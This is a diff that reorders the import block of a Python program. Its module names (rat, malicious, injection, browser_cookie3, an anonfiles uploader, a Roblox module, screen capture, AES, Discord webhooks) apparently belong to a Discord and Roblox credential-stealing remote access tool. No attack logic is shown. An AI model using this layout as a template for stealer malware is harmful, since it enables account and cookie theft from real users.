@@ -1,52 +1,48 @@
-import rat
-from config import Config
+import sys
+
 import _webhook
 import discordc
-import injection
 import informations
 import malicious
-import sys
+import rat
+from config import Config
+
+import injection
 
 ii = informations.Info()
 _webh = _webhook.WebhookX()
 cc = Config()
 
 try:
-    import os
-    import threading
-    import re
-    import time
-    import shutil
-    import random
-    import subprocess
-    import platform
-    import socket
     import getpass
-    import requests
-    import psutil
-    from PIL import ImageGrab
+    import os
+    import platform
+    import random
+    import re
+    import shutil
+    import socket
+    import subprocess
+    import threading
+    import time
     from base64 import b64decode
+    from ctypes import (POINTER, Structure, byref, c_buffer, c_char, cdll,
+                        windll, wintypes)
+    from json import dumps
+    from json import loads
     from json import loads as json_loads
-    from ctypes import (
-        windll,
-        wintypes,
-        byref,
-        cdll,
-        Structure,
-        POINTER,
-        c_char,
-        c_buffer,
-    )
-    from sys import executable, argv
     from sqlite3 import connect as sql_connect
+    from sys import argv, executable
     from urllib.request import Request, urlopen
-    from json import loads, dumps
     from zipfile import ZipFile
-    from Crypto.Cipher import AES
-    import dhooks
+
     import browser_cookie3
-    from anonFile import uploadToAnonfiles
+    import dhooks
+    import psutil
+    import requests
     from _roblox import RobloxX
+    from anonFile import uploadToAnonfiles
+    from Crypto.Cipher import AES
+    from PIL import ImageGrab
 except Exception:
     import subprocess
 
